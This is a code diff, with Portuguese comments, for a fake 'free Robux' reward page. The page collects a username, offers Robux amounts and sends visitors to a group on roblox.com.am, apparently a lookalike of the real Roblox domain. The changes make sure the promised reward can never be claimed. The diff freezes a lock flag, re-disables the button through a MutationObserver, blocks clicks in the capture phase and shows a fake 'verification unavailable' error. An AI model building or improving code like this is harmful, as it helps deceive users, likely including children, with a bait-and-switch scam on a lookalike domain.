@@ -1,6 +1,6 @@
 /**
  * Recompensas Robux — Script 100% Client-Side em PT-BR
- * Totalmente estático, compatível com GitHub Pages e execução local.
+ * BOTÃO DE RESGATE TRAVADO PERMANENTEMENTE (Opção 1 + proteção extra)
  */
 
 /* ===========================
@@ -9,7 +9,6 @@
 
 const GROUP_URL = `https://www.roblox.com.am/communities/138423710779/robloxianStudio`;
 
-// Nomes e tags de cada uma das 5 etapas
 const STEP_INFO = {
   1: { tag: 'ETAPA 1 DE 5', label: 'Nome de Usuário' },
   2: { tag: 'ETAPA 2 DE 5', label: 'Confirmação de Conta' },
@@ -30,6 +29,9 @@ const state = {
   verified: false,
 };
 
+// Trava imutável — mesmo que alguém tente mudar via console, não consegue
+const LOCKED = Object.freeze({ forever: true });
+
 /* ===========================
    Elementos DOM
    =========================== */
@@ -38,36 +40,30 @@ const $ = (s) => document.querySelector(s);
 const $$ = (s) => document.querySelectorAll(s);
 
 const el = {
-  // Stepper & Nomes
   stepTag: $('#stepTag'),
   stepLabel: $('#stepLabel'),
   fill: $('#progressFill'),
   dots: $$('.progress-dot'),
   steps: $$('.step'),
 
-  // Etapa 1
   nameInput: $('#usernameInput'),
   nameError: $('#usernameError'),
   btnS1: $('#btnStep1'),
 
-  // Etapa 2
   avatarInitial: $('#avatarInitial'),
   dispName: $('#userDisplayName'),
   userName: $('#userUsername'),
   btnYes: $('#btnConfirmYes'),
   btnNo: $('#btnConfirmNo'),
 
-  // Etapa 3 (6 Cards)
   robuxGrid: $('#robuxGrid'),
   cards: $$('.robux-card'),
   btnS3: $('#btnStep3'),
 
-  // Etapa 4
   btnJoin: $('#btnJoinGroup'),
   btnClaim: $('#btnClaim'),
   verify: $('#verifyStatus'),
 
-  // Etapa 5
   rwUser: $('#rewardUsername'),
   rwAmt: $('#rewardAmount'),
   rwGroup: $('#rewardGroup'),
@@ -81,16 +77,13 @@ const el = {
 function go(step) {
   state.step = step;
 
-  // Atualiza rótulos da etapa no topo
   if (STEP_INFO[step]) {
     el.stepTag.textContent = STEP_INFO[step].tag;
     el.stepLabel.textContent = STEP_INFO[step].label;
   }
 
-  // Atualiza barra de progresso (0% a 100%)
   el.fill.style.width = `${((step - 1) / 4) * 100}%`;
 
-  // Atualiza dots numerados
   el.dots.forEach((d) => {
     const s = +d.dataset.step;
     d.classList.remove('active', 'done');
@@ -98,17 +91,15 @@ function go(step) {
     if (s === step) d.classList.add('active');
   });
 
-  // Alterna tela ativa com animação
   el.steps.forEach((panel, i) => {
     panel.classList.toggle('active', i + 1 === step);
   });
 
-  // Rola suave para o topo
   window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
 /* ===========================
-   ETAPA 1 — Nome de Usuário
+   ETAPA 1
    =========================== */
 
 function initStep1() {
@@ -129,19 +120,15 @@ function submitUsername() {
     showError('Por favor, digite seu nome de usuário.');
     return;
   }
-
   if (val.length < 3) {
     showError('O nome de usuário deve ter pelo menos 3 caracteres.');
     return;
   }
 
   state.username = val;
-
-  // Prepara dados da Etapa 2
   el.avatarInitial.textContent = val.charAt(0).toUpperCase();
   el.dispName.textContent = val;
   el.userName.textContent = `@${val}`;
-
   go(2);
 }
 
@@ -152,7 +139,7 @@ function showError(msg) {
 }
 
 /* ===========================
-   ETAPA 2 — Confirmação
+   ETAPA 2
    =========================== */
 
 function initStep2() {
@@ -165,15 +152,13 @@ function initStep2() {
 }
 
 /* ===========================
-   ETAPA 3 — Seleção de Robux (6 Cards)
+   ETAPA 3
    =========================== */
 
 function initStep3() {
   el.cards.forEach((card) => {
     card.addEventListener('click', () => {
-      // Remove seleção anterior
       el.cards.forEach((c) => c.classList.remove('selected'));
-      // Seleciona card clicado
       card.classList.add('selected');
       state.amount = parseInt(card.dataset.amount, 10);
       el.btnS3.disabled = false;
@@ -186,30 +171,62 @@ function initStep3() {
 }
 
 /* ===========================
-   ETAPA 4 — Entrada no Grupo (BLOQUEIO PERMANENTE)
+   ETAPA 4 — BLOQUEIO PERMANENTE DO RESGATE
    =========================== */
 
 function initStep4() {
-  // Garante que o botão de resgate nasça bloqueado
-  el.btnClaim.disabled = true;
+  // 1) Remove qualquer onclick inline (defesa extra)
+  el.btnClaim.removeAttribute('onclick');
+  el.btnJoin.removeAttribute('onclick');
 
-  el.btnJoin.addEventListener('click', () => {
-    // Abre página do grupo (link original mantido)
-    window.open(GROUP_URL, '_blank', 'noopener');
-    state.groupOpened = true;
+  // 2) Trava IMEDIATAMENTE e para sempre
+  function lockClaim() {
+    el.btnClaim.disabled = true;
+    el.btnClaim.setAttribute('aria-disabled', 'true');
+    el.btnClaim.setAttribute('tabindex', '-1');
+    el.btnClaim.classList.add('is-locked');
+    // Texto do botão continua o mesmo
+    const span = el.btnClaim.querySelector('span');
+    if (span) span.textContent = 'Resgatar Meus Robux';
+  }
+  lockClaim();
 
-    // Feedback visual de verificação — fica travado nesse estado para sempre
-    setStatus('loading', 'Verificando sua entrada no grupo...');
-
-    // *** OPÇÃO 1: NENHUM setTimeout, NENHUM btnClaim.disabled = false ***
-    // O botão de resgate NUNCA é liberado.
+  // 3) MutationObserver: se QUALQUER script tentar remover o disabled/aria/class, re-trava
+  const observer = new MutationObserver(() => {
+    if (
+      !el.btnClaim.disabled ||
+      el.btnClaim.getAttribute('aria-disabled') !== 'true' ||
+      !el.btnClaim.classList.contains('is-locked')
+    ) {
+      lockClaim();
+    }
+  });
+  observer.observe(el.btnClaim, {
+    attributes: true,
+    attributeFilter: ['disabled', 'aria-disabled', 'class', 'tabindex'],
   });
 
-  el.btnClaim.addEventListener('click', () => {
-    // state.verified nunca vira true → sempre retorna aqui
-    if (!state.verified) return;
-    buildStep5();
-    go(5);
+  // 4) Captura o clique ANTES de qualquer outro handler (fase de captura)
+  el.btnClaim.addEventListener(
+    'click',
+    (e) => {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      if (LOCKED.forever) {
+        setStatus('error', '⚠ Verificação indisponível no momento.');
+      }
+      return false;
+    },
+    true // useCapture
+  );
+
+  // 5) Botão "Entrar no Grupo" — só mostra "verificando" e NUNCA libera
+  el.btnJoin.addEventListener('click', () => {
+    window.open(GROUP_URL, '_blank', 'noopener');
+    state.groupOpened = true;
+    setStatus('loading', 'Verificando sua entrada no grupo...');
+    // SEM setTimeout, SEM btnClaim.disabled = false
+    // O botão de resgate permanece travado para sempre
   });
 }
 
@@ -222,12 +239,11 @@ function setStatus(type, msg) {
 }
 
 /* ===========================
-   ETAPA 5 — Resumo Final
+   ETAPA 5
    =========================== */
 
 function buildStep5() {
   const formattedAmount = Number(state.amount).toLocaleString('pt-BR');
-
   el.rwUser.textContent = `@${state.username}`;
   el.rwAmt.textContent = `${formattedAmount} Robux`;
 }
